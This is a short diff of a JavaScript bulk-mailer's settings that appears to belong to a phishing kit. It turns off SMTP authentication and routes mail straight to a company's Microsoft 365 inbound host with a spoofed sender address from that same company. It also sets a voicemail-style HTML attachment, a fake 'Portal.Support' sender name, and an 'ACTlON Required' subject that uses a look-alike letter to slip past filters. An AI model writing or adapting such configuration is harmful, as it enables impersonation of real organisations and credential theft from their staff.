@@ -99,10 +99,10 @@ function replacePlaceholders(content, placeholders) {
 
 const options = {
   method: 'SMTP', // Options: 'SMTP', 'MX'
-  useAuthentication: true,
+  useAuthentication: false,
   useProxy: false,
   proxyType: 'SOCKS5', // Options: 'SOCKS', 'HTTPS'
-  smtpHost: 'synsysinc-com.mail.protection.outlook.com',
+  smtpHost: 'efasglobal-com.mail.protection.outlook.com',
   smtpPort: 25,
   smtpSecure: false,
   secureProtocol: 'SSLv23_method', // Options: 'SSLv23_method', 'TLSv1_2_method', etc.
@@ -122,7 +122,7 @@ const options = {
 
 
 const attachmentNameWithPlaceholders = 'vm-20241104193406035753-fadceb388a85af9bdf506d7fgds693hdj.html';
-const senderAddresses = ['mvurda@synsysinc.com'];
+const senderAddresses = ['john@efasglobal.com'];
 const messageFile = 'msg.txt';
 const senderNameWithPlaceholders = "Portal.Support"; 
 const subjectLineWithPlaceholders = "ACTlON Required- {RECIPIENT_DOMAIN_NAME} Server SecurityID:{RANDOM_STRING}";
